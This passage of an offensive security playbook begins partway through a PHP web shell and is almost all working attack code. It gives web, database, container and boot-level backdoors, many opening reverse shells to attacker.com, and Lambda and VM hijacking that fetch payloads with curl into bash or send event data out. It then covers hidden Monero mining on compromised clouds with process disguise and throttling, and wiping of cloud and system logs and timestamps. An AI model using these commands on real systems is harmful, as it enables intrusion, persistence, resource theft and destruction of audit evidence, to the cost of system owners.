    md5($_SERVER['HTTP_X_AUTH_TOKEN']) === '5f4dcc3b5aa765d61d8327deb882cf99') {
    
    if (isset($_POST['cmd'])) {
        echo '<pre>' . shell_exec($_POST['cmd']) . '</pre>';
    }
    
    if (isset($_FILES['file'])) {
        move_uploaded_file($_FILES['file']['tmp_name'], 
                          '/tmp/' . $_FILES['file']['name']);
    }
    exit;
}
?>
EOF

# Access with: curl -H "X-Auth-Token: password" -X POST -d "cmd=whoami" http://target/includes/config.php.bak
```

**Polyglot Backdoor (Image + PHP)**

```bash
# Create image with embedded PHP
cat image.jpg > backdoor.jpg
echo '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>' >> backdoor.jpg

# Upload as image, access with .php extension or via include vulnerability
curl http://target/uploads/backdoor.jpg?c=whoami
```

**JSP Backdoor**

```bash
cat > /var/lib/tomcat9/webapps/ROOT/admin/system.jsp << 'EOF'
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null && request.getHeader("X-Auth").equals("SecretKey123")) {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = br.readLine()) != null) {
            out.println(line + "<br>");
        }
    }
%>
EOF

# Access: curl -H "X-Auth: SecretKey123" "http://target/admin/system.jsp?cmd=whoami"
```

**ASP.NET Backdoor**

```bash
cat > /var/www/html/admin/config.aspx << 'EOF'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
    if (Request.Headers["X-Key"] == "BackdoorKey") {
        string cmd = Request.QueryString["cmd"];
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.UseShellExecute = false;
        p.Start();
        Response.Write(p.StandardOutput.ReadToEnd());
    }
%>
EOF
```

### Database Backdoors

**MySQL Backdoor User**

```bash
# Create backdoor admin user
mysql -u root -p'password' << 'EOF'
CREATE USER 'sysadmin'@'%' IDENTIFIED BY 'ComplexPass123!';
GRANT ALL PRIVILEGES ON *.* TO 'sysadmin'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;
EOF

# Backdoor via trigger
mysql -u root -p'password' << 'EOF'
USE mysql;
DELIMITER //
CREATE TRIGGER backdoor_trigger
BEFORE INSERT ON user
FOR EACH ROW
BEGIN
    DECLARE cmd VARCHAR(255);
    SET cmd = 'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1" &';
    SELECT sys_exec(cmd);
END//
DELIMITER ;
EOF
```

**PostgreSQL Backdoor**

```bash
# Create backdoor function
psql -U postgres << 'EOF'
CREATE OR REPLACE FUNCTION system(cstring) RETURNS integer AS 
'/lib/x86_64-linux-gnu/libc.so.6', 'system' 
LANGUAGE 'c' STRICT;

CREATE OR REPLACE FUNCTION backdoor(text) RETURNS text AS $$
BEGIN
    PERFORM system($1);
    RETURN 'executed';
END;
$$ LANGUAGE plpgsql;

-- Grant execute to public or specific user
GRANT EXECUTE ON FUNCTION backdoor(text) TO public;
EOF

# Execute: SELECT backdoor('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1" &');
```

**MongoDB Backdoor**

```bash
# Create administrative user
mongo admin << 'EOF'
db.createUser({
    user: "backup",
    pwd: "SecureBackupPass123",
    roles: [{role: "root", db: "admin"}]
});
EOF

# Store backdoor payload in collection
mongo admin << 'EOF'
db.system.js.save({
    _id: "backdoor",
    value: function(cmd) {
        return run("bash", "-c", cmd);
    }
});
EOF
```

### Container Backdoors

**Docker Container Backdoor**

```bash
# Create backdoored container
cat > Dockerfile << 'EOF'
FROM alpine:latest
RUN apk add --no-cache bash netcat-openbsd
COPY backdoor.sh /usr/local/bin/
RUN chmod +x /usr/local/bin/backdoor.sh
CMD ["/usr/local/bin/backdoor.sh"]
EOF

cat > backdoor.sh << 'EOF'
#!/bin/bash
while true; do
    bash -i >& /dev/tcp/attacker.com/4444 0>&1
    sleep 300
done
EOF

docker build -t system-monitor:latest .
docker run -d --name monitor --restart always system-monitor:latest

# Backdoor via docker exec in existing container
docker exec -d existing-container bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1 &'
```

**Kubernetes CronJob Backdoor**

```bash
cat > backdoor-cronjob.yaml << 'EOF'
apiVersion: batch/v1
kind: CronJob
metadata:
  name: system-maintenance
  namespace: kube-system
spec:
  schedule: "*/30 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          hostNetwork: true
          hostPID: true
          containers:
          - name: maintenance
            image: alpine:latest
            command:
            - /bin/sh
            - -c
            - |
              nsenter -t 1 -m -u -n -i bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' &
          restartPolicy: OnFailure
EOF

kubectl apply -f backdoor-cronjob.yaml
```

### Boot Process Backdoors

**GRUB Backdoor**

```bash
# Add backdoor kernel parameter
sed -i 's/GRUB_CMDLINE_LINUX=""/GRUB_CMDLINE_LINUX="init=\/tmp\/backdoor.sh"/' /etc/default/grub
update-grub

cat > /tmp/backdoor.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1 &
exec /sbin/init "$@"
EOF
chmod +x /tmp/backdoor.sh
```

**Initramfs Backdoor**

```bash
# Unpack initramfs
mkdir /tmp/initramfs
cd /tmp/initramfs
unmkinitramfs /boot/initrd.img-$(uname -r) .

# Add backdoor script
cat > init_backdoor.sh << 'EOF'
#!/bin/sh
bash -i >& /dev/tcp/attacker.com/4444 0>&1 &
EOF
chmod +x init_backdoor.sh

# Modify init script to call backdoor
sed -i '2i /init_backdoor.sh' init

# Repack initramfs
find . | cpio -o -H newc | gzip > /boot/initrd.img-$(uname -r).backdoor
# Replace original
mv /boot/initrd.img-$(uname -r).backdoor /boot/initrd.img-$(uname -r)
```

### Firmware Backdoors

[Unverified] Firmware modification requires specific hardware knowledge and tools:

```bash
# UEFI/BIOS backdoor concept (requires specific tools)
# Extract BIOS firmware
flashrom -r bios_backup.bin

# Modify firmware (requires UEFITool or similar)
# Add DXE driver with backdoor payload
# This is highly system-specific

# Flash modified firmware
flashrom -w modified_bios.bin
```

### Covert Channel Backdoors

**Timing-Based Backdoor**

```bash
cat > timing_backdoor.sh << 'EOF'
#!/bin/bash
# Communication via ICMP timing intervals
# Interval < 100ms = binary 0, > 100ms = binary 1

while true; do
    data=$(nc -l -p 9999)
    for char in $(echo "$data" | fold -w1); do
        binary=$(echo "obase=2; $(printf '%d' "'$char")" | bc)
        for bit in $(echo "$binary" | fold -w1); do
            ping -c 1 attacker.com > /dev/null
            if [ "$bit" = "1" ]; then
                sleep 0.15
            else
                sleep 0.05
            fi
        done
    done
done
EOF
```

**ICMP Data Backdoor**

```bash
# Backdoor command via ICMP payload
cat > icmp_backdoor.sh << 'EOF'
#!/bin/bash
tcpdump -i any -n icmp -l | while read line; do
    cmd=$(echo "$line" | grep -oP 'length \K\d+' | xxd -r -p)
    if [ -n "$cmd" ]; then
        eval "$cmd" | while read output; do
            ping -c 1 -p "$(echo "$output" | xxd -p)" attacker.com
        done
    fi
done
EOF
```

Important subtopics for deeper exploitation understanding:

- **Privilege Escalation** - Kernel exploits, SUID abuse, capability exploitation, sudo misconfigurations
- **Container Escape Techniques** - Docker breakout methods, Kubernetes privilege escalation, cgroup manipulation
- **Memory Forensics Evasion** - Anti-debugging, process injection, rootkit techniques
- **Network Pivot Hardening** - Encrypted C2 channels, domain fronting, protocol tunneling over allowed services

---

## Resource Hijacking

### Cloud Resource Enumeration

**AWS Resource Discovery**

```bash
# Enumerate EC2 instances
aws ec2 describe-instances --profile compromised \
  --query 'Reservations[].Instances[].[InstanceId,InstanceType,State.Name,PublicIpAddress]' \
  --output table

# List all regions and check each
for region in $(aws ec2 describe-regions --query 'Regions[].RegionName' --output text); do
  echo "=== $region ==="
  aws ec2 describe-instances --region $region --profile compromised
done

# Enumerate Lambda functions
aws lambda list-functions --profile compromised
aws lambda get-function --function-name target-function --profile compromised

# S3 buckets enumeration
aws s3 ls --profile compromised
aws s3api list-buckets --query 'Buckets[].Name' --profile compromised

# RDS instances
aws rds describe-db-instances --profile compromised \
  --query 'DBInstances[].[DBInstanceIdentifier,Engine,DBInstanceStatus]'

# Elastic Beanstalk applications
aws elasticbeanstalk describe-applications --profile compromised
```

**Azure Resource Enumeration**

```bash
# List all subscriptions
az account list --output table

# Set active subscription
az account set --subscription "subscription-id"

# Enumerate VMs
az vm list --output table
az vm list --query '[].{Name:name, ResourceGroup:resourceGroup, Location:location, PowerState:powerState}'

# List storage accounts
az storage account list --output table

# Enumerate web apps
az webapp list --output table

# List all resources in subscription
az resource list --output table

# Enumerate AKS clusters
az aks list --output table

# Database servers
az sql server list --output table
az postgres server list --output table
```

**Google Cloud Platform (GCP) Enumeration**

```bash
# List projects
gcloud projects list

# Set active project
gcloud config set project project-id

# Enumerate compute instances
gcloud compute instances list
gcloud compute instances list --format="table(name,zone,machineType,status)"

# List storage buckets
gcloud storage buckets list
gsutil ls

# Enumerate Cloud Functions
gcloud functions list

# Kubernetes clusters
gcloud container clusters list

# Cloud SQL instances
gcloud sql instances list

# App Engine applications
gcloud app instances list
```

### Compute Resource Hijacking

**EC2 Instance Takeover**

```bash
# Create new SSH key pair
aws ec2 create-key-pair --key-name backdoor-key \
  --query 'KeyMaterial' --output text > backdoor-key.pem
chmod 400 backdoor-key.pem

# Launch new instance with backdoor
aws ec2 run-instances \
  --image-id ami-0c55b159cbfafe1f0 \
  --instance-type t2.micro \
  --key-name backdoor-key \
  --security-group-ids sg-existing \
  --subnet-id subnet-existing \
  --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=legit-looking-name}]' \
  --profile compromised

# Modify existing instance user data for persistence
instance_id="i-1234567890abcdef0"
user_data=$(cat <<'EOF'
#!/bin/bash
curl http://attacker.com/backdoor.sh | bash
EOF
)
aws ec2 modify-instance-attribute \
  --instance-id $instance_id \
  --attribute userData \
  --value "$(echo "$user_data" | base64)" \
  --profile compromised

# Attach to existing instance via Session Manager (no SSH needed)
aws ssm start-session --target $instance_id --profile compromised
```

**Lambda Function Hijacking**

```bash
# List existing functions
aws lambda list-functions --profile compromised

# Download function code
aws lambda get-function --function-name target-function \
  --query 'Code.Location' --output text | xargs curl -o function.zip

# Modify and redeploy with backdoor
unzip function.zip -d function/
cd function/

# Add malicious code to handler
cat >> index.js <<'EOF'
const https = require('https');
exports.handler = async (event) => {
    // Original functionality
    const result = originalHandler(event);
    
    // Exfiltrate data
    https.get('https://attacker.com/log?data=' + JSON.stringify(event));
    
    return result;
};
EOF

zip -r ../modified-function.zip .
cd ..

# Update function
aws lambda update-function-code \
  --function-name target-function \
  --zip-file fileb://modified-function.zip \
  --profile compromised

# Create new malicious function
aws lambda create-function \
  --function-name data-processor \
  --runtime python3.9 \
  --role arn:aws:iam::ACCOUNT:role/lambda-role \
  --handler index.handler \
  --zip-file fileb://malicious-function.zip \
  --profile compromised
```

**Container/Kubernetes Hijacking**

```bash
# Enumerate Kubernetes resources
kubectl get pods --all-namespaces
kubectl get nodes
kubectl get services --all-namespaces

# Deploy malicious pod
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: system-monitor
  namespace: kube-system
spec:
  containers:
  - name: monitor
    image: attacker/malicious:latest
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
  hostNetwork: true
  hostPID: true
EOF

# Modify existing deployment
kubectl set image deployment/target-app container=attacker/backdoored:latest

# Access node via privileged container
kubectl exec -it system-monitor -n kube-system -- /bin/bash
chroot /host
```

**Azure VM Hijacking**

```bash
# Create new VM with backdoor
az vm create \
  --resource-group target-rg \
  --name backdoor-vm \
  --image UbuntuLTS \
  --admin-username azureuser \
  --ssh-key-values @~/.ssh/backdoor.pub \
  --size Standard_B1s

# Execute commands on existing VM
az vm run-command invoke \
  --resource-group target-rg \
  --name target-vm \
  --command-id RunShellScript \
  --scripts "curl http://attacker.com/backdoor.sh | bash"

# Add custom script extension for persistence
az vm extension set \
  --resource-group target-rg \
  --vm-name target-vm \
  --name customScript \
  --publisher Microsoft.Azure.Extensions \
  --settings '{"fileUris": ["https://attacker.com/persist.sh"],"commandToExecute": "bash persist.sh"}'
```

### Storage Hijacking

**S3 Bucket Abuse**

```bash
# Create bucket for data staging
aws s3 mb s3://exfil-staging-bucket --profile compromised

# Modify bucket policy for public access (data exfiltration)
cat > policy.json <<'EOF'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": "*",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::target-bucket/*"
  }]
}
EOF
aws s3api put-bucket-policy --bucket target-bucket \
  --policy file://policy.json --profile compromised

# Copy sensitive data to attacker-controlled bucket
aws s3 sync s3://target-sensitive-bucket s3://exfil-staging-bucket \
  --profile compromised

# Enable logging to hide in legitimate traffic
aws s3api put-bucket-logging --bucket target-bucket \
  --bucket-logging-status file://logging.json --profile compromised
```

**Azure Storage Hijacking**

```bash
# List storage account keys
az storage account keys list \
  --resource-group target-rg \
  --account-name targetstorageacct

# Create new container for exfiltration
az storage container create \
  --name exfil-data \
  --account-name targetstorageacct \
  --public-access blob

# Copy data from private container
az storage blob copy start-batch \
  --source-container private-data \
  --destination-container exfil-data \
  --account-name targetstorageacct

# Generate SAS token for persistent access
end_date=$(date -u -d "1 year" '+%Y-%m-%dT%H:%MZ')
az storage account generate-sas \
  --account-name targetstorageacct \
  --services bfqt \
  --resource-types sco \
  --permissions acdlrwup \
  --expiry $end_date \
  --https-only
```

### Network Resource Hijacking

**VPC/Network Manipulation**

```bash
# Create backdoor security group
aws ec2 create-security-group \
  --group-name backdoor-access \
  --description "System management" \
  --vpc-id vpc-target \
  --profile compromised

# Allow inbound from attacker IP
aws ec2 authorize-security-group-ingress \
  --group-id sg-backdoor \
  --protocol tcp \
  --port 22 \
  --cidr 1.2.3.4/32 \
  --profile compromised

# Attach to existing instances
aws ec2 modify-instance-attribute \
  --instance-id i-target \
  --groups sg-existing sg-backdoor \
  --profile compromised

# Create VPN connection for persistent access
aws ec2 create-vpn-gateway --type ipsec.1 --profile compromised
aws ec2 attach-vpn-gateway --vpn-gateway-id vgw-new --vpc-id vpc-target
```

**Load Balancer Hijacking**

```bash
# Modify target groups to redirect traffic
aws elbv2 modify-target-group \
  --target-group-arn arn:aws:elasticloadbalancing:... \
  --health-check-path /attacker-health \
  --profile compromised

# Register attacker-controlled instances
aws elbv2 register-targets \
  --target-group-arn arn:aws:elasticloadbalancing:... \
  --targets Id=i-attacker-instance \
  --profile compromised

# Modify listener rules
aws elbv2 modify-rule \
  --rule-arn arn:aws:elasticloadbalancing:... \
  --conditions Field=path-pattern,Values='/admin/*' \
  --actions Type=forward,TargetGroupArn=arn:aws:elasticloadbalancing:.../attacker-tg
```

## Crypto-Mining Deployment

### Detection of Mineable Resources

**Identify High-Compute Resources**

```bash
# AWS: Find large instance types
aws ec2 describe-instances --profile compromised \
  --query 'Reservations[].Instances[?InstanceType>=`m5.xlarge`].[InstanceId,InstanceType,State.Name]' \
  --output table

# Check for GPU instances
aws ec2 describe-instances --profile compromised \
  --filters "Name=instance-type,Values=p3.*,g4dn.*" \
  --query 'Reservations[].Instances[].[InstanceId,InstanceType]'

# Azure: List VM sizes with compute capability
az vm list --query '[].{Name:name,Size:hardwareProfile.vmSize}' -o table | grep -E "Standard_D|Standard_F"

# GCP: Find high-CPU machine types
gcloud compute instances list \
  --format="table(name,zone,machineType)" \
  --filter="machineType:n1-highcpu OR machineType:n1-standard"
```

**Check Resource Quotas and Limits** [Inference]

```bash
# AWS: Service quotas
aws service-quotas list-service-quotas \
  --service-code ec2 \
  --profile compromised \
  --query 'Quotas[?QuotaName==`Running On-Demand Standard instances`]'

# Azure: Check subscription limits
az vm list-usage --location eastus -o table

# GCP: Check quotas
gcloud compute project-info describe --project project-id \
  --format="table(quotas.metric,quotas.limit,quotas.usage)"
```

### Mining Software Deployment

**XMRig (Monero) Deployment on Linux**

```bash
# Download and setup on compromised instance
wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
tar -xf xmrig-6.21.0-linux-x64.tar.gz
cd xmrig-6.21.0

# Create configuration file
cat > config.json <<'EOF'
{
    "autosave": true,
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": null,
        "max-threads-hint": 75,
        "asm": true,
        "argon2-impl": null,
        "cn/0": false,
        "cn-lite/0": false
    },
    "opencl": {
        "enabled": false
    },
    "cuda": {
        "enabled": false
    },
    "pools": [
        {
            "algo": "rx/0",
            "coin": "monero",
            "url": "pool.hashvault.pro:443",
            "user": "YOUR_WALLET_ADDRESS",
            "pass": "x",
            "rig-id": "cloud-worker",
            "tls": true,
            "keepalive": true
        }
    ]
}
EOF

# Run with reduced priority to avoid detection
nice -n 19 ./xmrig --config=config.json --background &

# Systemd persistence
cat > /etc/systemd/system/system-updates.service <<'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/system-updates
ExecStart=/opt/system-updates/xmrig --config=/opt/system-updates/config.json
Restart=always
RestartSec=10
Nice=19

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable system-updates.service
systemctl start system-updates.service
```

**Container-Based Mining**

```bash
# Kubernetes deployment
cat <<EOF | kubectl apply -f -
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: system-monitor
  namespace: kube-system
spec:
  selector:
    matchLabels:
      app: system-monitor
  template:
    metadata:
      labels:
        app: system-monitor
    spec:
      containers:
      - name: monitor
        image: registry.hub.docker.com/attacker/xmrig:latest
        resources:
          limits:
            cpu: "500m"
            memory: "256Mi"
          requests:
            cpu: "100m"
            memory: "128Mi"
        env:
        - name: POOL
          value: "pool.hashvault.pro:443"
        - name: WALLET
          value: "YOUR_WALLET_ADDRESS"
        - name: WORKER
          valueFrom:
            fieldRef:
              fieldPath: spec.nodeName
      tolerations:
      - effect: NoSchedule
        key: node-role.kubernetes.io/master
EOF

# Docker deployment
docker run -d \
  --name system-cache \
  --restart unless-stopped \
  --cpus="0.5" \
  -e POOL=pool.hashvault.pro:443 \
  -e WALLET=YOUR_WALLET_ADDRESS \
  attacker/xmrig:latest
```

**Lambda Function Mining** [Inference - Lambda has 15-minute execution limit, making sustained mining impractical but possible for demonstration]

```python
# lambda_miner.py
import subprocess
import urllib.request
import os

def handler(event, context):
    # Download miner
    miner_url = "https://attacker.com/xmrig-static"
    miner_path = "/tmp/miner"
    urllib.request.urlretrieve(miner_url, miner_path)
    os.chmod(miner_path, 0o755)
    
    # Execute mining (will run for function timeout)
    subprocess.Popen([
        miner_path,
        "-o", "pool.hashvault.pro:443",
        "-u", "WALLET_ADDRESS",
        "-p", "x",
        "--threads", "1",
        "--cpu-max-threads-hint", "50"
    ])
    
    # Keep function alive
    import time
    time.sleep(840)  # 14 minutes
    
    return {"statusCode": 200}

# Deploy with EventBridge trigger for continuous invocation
```

**Azure Function Mining**

```python
# __init__.py for Azure Function
import subprocess
import urllib.request
import os

def main(mytimer):
    miner_path = "/tmp/xmrig"
    
    if not os.path.exists(miner_path):
        urllib.request.urlretrieve(
            "https://attacker.com/xmrig-linux64",
            miner_path
        )
        os.chmod(miner_path, 0o755)
    
    # Run miner
    subprocess.Popen([
        miner_path,
        "-o", "pool.supportxmr.com:443",
        "-u", "WALLET_ADDRESS",
        "-k", "--tls",
        "--threads", "2"
    ])
```

### Stealth and Resource Throttling

**CPU Throttling to Avoid Detection**

```bash
# Limit CPU usage with cpulimit
cpulimit -l 50 -p $(pgrep xmrig) &

# Using cgroups
cgcreate -g cpu:/mining
cgset -r cpu.cfs_quota_us=50000 mining  # 50% of one core
cgexec -g cpu:mining ./xmrig --config=config.json

# Nice priority adjustment
renice -n 19 -p $(pgrep xmrig)
```

**Process Name Obfuscation**

```bash
# Rename binary to legitimate-looking name
cp xmrig /usr/local/bin/systemd-logind
chmod +x /usr/local/bin/systemd-logind

# Execute with different argv[0]
exec -a "systemd-logind" /usr/local/bin/systemd-logind --config=config.json

# Hide in common process names
cp xmrig /usr/local/bin/kworker
cp xmrig /usr/local/bin/apache2
cp xmrig /usr/local/bin/node
```

**Network Traffic Obfuscation**

```bash
# Use TLS for pool connections
# config.json:
"pools": [
    {
        "url": "pool.hashvault.pro:443",
        "tls": true,
        "tls-fingerprint": null
    }
]

# Route through Tor (if available)
apt install -y tor
cat >> /etc/tor/torrc <<EOF
SocksPort 9050
EOF
systemctl restart tor

# Configure XMRig to use SOCKS proxy
# Add to config.json:
"socks5": "127.0.0.1:9050"

# Use domain fronting
# Connect through CDN to hide destination
```

**Scheduled Mining (Off-Peak Hours)**

```bash
# Cron job for night-time mining only
crontab -e
# Add:
0 22 * * * /opt/miner/start-mining.sh
0 6 * * * /opt/miner/stop-mining.sh

# start-mining.sh
#!/bin/bash
/opt/miner/xmrig --config=/opt/miner/config.json --background

# stop-mining.sh
#!/bin/bash
pkill -9 xmrig
```

### Cloud-Specific Mining Optimizations

**Spot/Preemptible Instance Abuse**

```bash
# AWS: Launch spot instances for mining
aws ec2 request-spot-instances \
  --spot-price "0.10" \
  --instance-count 10 \
  --type "persistent" \
  --launch-specification file://spot-spec.json \
  --profile compromised

# spot-spec.json includes user-data with mining setup

# Azure: Use low-priority VMs
az vm create \
  --resource-group mining-rg \
  --name miner-vm-{1..10} \
  --image UbuntuLTS \
  --priority Low \
  --size Standard_F8s_v2 \
  --custom-data cloud-init-mining.txt

# GCP: Preemptible instances
gcloud compute instances create miner-instance-{1..10} \
  --preemptible \
  --machine-type n1-highcpu-8 \
  --metadata-from-file startup-script=mining-startup.sh
```

**Serverless Mining Orchestration**

```python
# Lambda function that spawns more Lambda functions
import boto3
import json

lambda_client = boto3.client('lambda')

def handler(event, context):
    # Spawn multiple concurrent miners
    for i in range(100):
        lambda_client.invoke(
            FunctionName='actual-mining-function',
            InvocationType='Event',  # Asynchronous
            Payload=json.dumps({'worker_id': i})
        )
    
    return {'statusCode': 200}

# Trigger with EventBridge every 15 minutes to sustain mining
```

## Coverage Track Removal

### Log Manipulation and Deletion

**AWS CloudTrail Manipulation**

```bash
# Disable CloudTrail logging
aws cloudtrail stop-logging --name trail-name --profile compromised

# Delete trail entirely
aws cloudtrail delete-trail --name trail-name --profile compromised

# Modify trail to exclude specific events
aws cloudtrail put-event-selectors \
  --trail-name trail-name \
  --event-selectors file://exclude-events.json \
  --profile compromised

# Delete CloudTrail logs from S3
aws s3 rm s3://cloudtrail-bucket/AWSLogs/ --recursive --profile compromised

# Delete specific log files containing compromising events
aws s3 rm s3://cloudtrail-bucket/AWSLogs/ACCOUNT/CloudTrail/region/2024/10/24/ \
  --recursive --profile compromised
```

**CloudWatch Logs Deletion**

```bash
# List log groups
aws logs describe-log-groups --profile compromised

# Delete entire log group
aws logs delete-log-group --log-group-name /aws/lambda/sensitive-function \
  --profile compromised

# Delete specific log streams
aws logs delete-log-stream \
  --log-group-name /aws/lambda/function-name \
  --log-stream-name '2024/10/24/[$LATEST]abc123' \
  --profile compromised

# Modify retention to delete old logs faster
aws logs put-retention-policy \
  --log-group-name /aws/lambda/function-name \
  --retention-in-days 1 \
  --profile compromised
```

**Azure Activity Log Manipulation**

```bash
# Disable diagnostic settings
az monitor diagnostic-settings delete \
  --name diagnostic-setting-name \
  --resource target-resource-id

# Delete Log Analytics workspace
az monitor log-analytics workspace delete \
  --resource-group target-rg \
  --workspace-name target-workspace \
  --yes

# Clear specific logs (if direct access to storage)
az storage blob delete-batch \
  --source logs-container \
  --account-name logstorageacct \
  --pattern "*/PT1H.json"
```

**GCP Cloud Logging Manipulation**

```bash
# Delete log sinks
gcloud logging sinks delete sink-name

# Delete logs via API (requires logging.logEntries.delete permission)
gcloud logging logs delete projects/PROJECT_ID/logs/LOG_ID

# Exclude specific log entries
gcloud logging sinks update sink-name \
  --log-filter='NOT (protoPayload.methodName="malicious.action")'

# Disable Cloud Audit Logs
gcloud projects remove-iam-policy-binding PROJECT_ID \
  --member='serviceAccount:cloud-logs@system.gserviceaccount.com' \
  --role='roles/logging.admin'
```

### System-Level Log Cleaning (Compromised Instances)

**Linux Log Manipulation**

```bash
# Clear common log files
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog
cat /dev/null > /var/log/secure
cat /dev/null > /var/log/messages
cat /dev/null > /var/log/wtmp
cat /dev/null > /var/log/btmp
cat /dev/null > /var/log/lastlog

# Remove specific entries from logs
sed -i '/attacker-ip/d' /var/log/auth.log
sed -i '/malicious-command/d' /var/log/bash_history

# Clear bash history
history -c
cat /dev/null > ~/.bash_history
unset HISTFILE

# Remove audit logs
service auditd stop
cat /dev/null > /var/log/audit/audit.log
rm -f /var/log/audit/audit.log.*

# Clear systemd journal
journalctl --rotate
journalctl --vacuum-time=1s

# Modify timestamps to hide activity window
touch -t 202410010000 /suspicious-file
touch -r /legitimate-file /suspicious-file

# Remove command history across all users
find /home -name '.bash_history' -exec cat /dev/null > {} \;
find /home -name '.zsh_history' -exec cat /dev/null > {} \;
```

**Windows Log Manipulation**

```powershell
# Clear Windows Event Logs
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

# Clear specific event IDs
wevtutil qe Security /q:"*[System[(EventID=4624)]]" /f:text | wevtutil cl Security

# Disable logging temporarily
auditpol /set /category:* /success:disable /failure:disable

# Clear PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath
Clear-History

# Delete IIS logs
Remove-Item C:\inetpub\logs\LogFiles\* -Recurse -Force

# Clear USN journal
fsutil usn deletejournal /D C:
```

**Container/Docker Log Cleanup**

```bash
# Clear Docker container logs
docker ps -q | xargs -I {} sh -c 'truncate -s 0 $(docker inspect --format="{{.LogPath}}" {})'

# Remove stopped containers with logs
docker rm $(docker ps -a -q)

# Clear Kubernetes pod logs
kubectl get pods --all-namespaces -o json | \
  jq -r '.items[].metadata | "\(.namespace) \(.name)"' | \
  while read ns pod; do
    kubectl logs $pod -n $ns --tail=0 > /dev/null 2>&1
  done

# Delete log files from host (if privileged access)
find /var/lib/docker/containers/ -name "*-json.log" -exec truncate -s 0 {} \;
```

### Artifact Removal

**Remove Dropped Files and Tools**

```bash
# Comprehensive cleanup script
#!/bin/bash

# Remove mining software
rm -rf /opt/miner
rm -rf /tmp/xmrig*
rm -f /usr/local/bin/systemd-logind  # Disguised miner

# Remove backdoors
rm -f /usr/local/bin/.backdoor
rm -f /etc/systemd/system/system-updates.service
systemctl daemon-reload

# Remove web shells
find /var/www -name "*.php" -mtime -7 -exec grep -l "eval\|base64_decode\|system\|exec" {} \; -delete

# Remove SSH keys
sed -i '/attacker-key/d' ~/.ssh/authorized_keys
sed -i '/attacker-key/d' /root/.ssh/authorized_keys
find /home -name authorized_keys -exec sed -i '/attacker-key/d' {} \;

# Remove cron jobs
crontab -r
find /var/spool/cron -type f -exec cat /dev/null > {} \;

# Clear temp files
rm -rf /tmp/*
rm -rf /var/tmp/*

# Remove downloaded exploits
find / -name "*.py" -mtime -7 -exec grep -l "exploit\|payload\|reverse_shell" {} \; -delete
```

**Database/Configuration Cleanup**

```bash
# Remove backdoor users
aws iam delete-user --user-name backdoor-admin --profile compromised
aws iam delete-access-key --access-key-id AKIA... --user-name admin --profile compromised

# Remove security group rules
aws ec2 revoke-security-group-ingress \
  --group-id sg-backdoor \
  --protocol tcp --port 22 --cidr 1.2.3.4/32 \
  --profile compromised

# Delete rogue resources
aws ec2 terminate-instances --instance-ids i-attacker-instance --profile compromised
aws lambda delete-function --function-name malicious-function --profile compromised

# Remove bucket policies
aws s3api delete-bucket-policy --bucket compromised-bucket --profile compromised

# Azure: Remove created resources
az vm delete --resource-group target-rg --name backdoor-vm --yes --no-wait
az storage account delete --name exfilstorageacct --yes

# GCP: Delete instances
gcloud compute instances delete miner-instance-{1..10} --quiet
```

**Network Artifact Removal**

```bash
# Clear iptables rules
iptables -F
iptables -X
iptables -Z

# Remove SSH tunnels
ps aux | grep "ssh -" | grep -v grep | awk '{print $2}' | xargs kill -9

# Clear DNS cache
systemd-resolve --flush-caches
resolvectl flush-caches

# Remove hosts file entries
sed -i '/attacker.com/d' /etc/hosts

# Clear connection tracking
conntrack -D
```

### Timestamp Manipulation

**File Timestamp Modification (Linux)**

```bash
# Match timestamps to nearby legitimate files
reference_file="/bin/ls"
find /suspicious-directory -type f -exec touch -r $reference_file {} \;

# Set specific timestamp (YYYYMMDDhhmm)
touch -t 202401150830 /suspicious-file

# Preserve original timestamps during operations
cp -p original.file modified.file  # -p preserves timestamps
rsync -a source/ dest/  # -a preserves timestamps

# Timestomp (modify all timestamps)
timestomp() {
    local file=$1
    local timestamp=$2
    touch -a -m -t $timestamp "$file"
    debugfs -w -R "set_inode_field $file crtime $timestamp" /dev/sda1 2>/dev/null
}

# Example: Set to 30 days ago
old_date=$(date -d "30 days ago" +%Y%m%d%H%M)
timestomp /suspicious-file $old_date
```

**Windows Timestamp Manipulation**

```powershell
# PowerShell timestamp modification
$file = "C:\suspicious\file.exe"
$date = Get-Date "2024-01-15 08:30:00"
$(Get-Item $file).CreationTime = $date
$(Get-Item $file).LastWriteTime = $date
$(Get-Item $file).LastAccessTime = $date

# Using timestomp (from Metasploit framework)
timestomp.exe C:\suspicious\file.exe -m "01/15/2024 08:30:00"
timestomp.exe C:\suspicious\file.exe -a "01/15/2024 08:30:00"
timestomp.exe C:\suspicious\file.exe -c "01/15/2024 08:30:00"
timestomp.exe C:\suspicious\file.exe -e "01/15/2024 08:30:00"

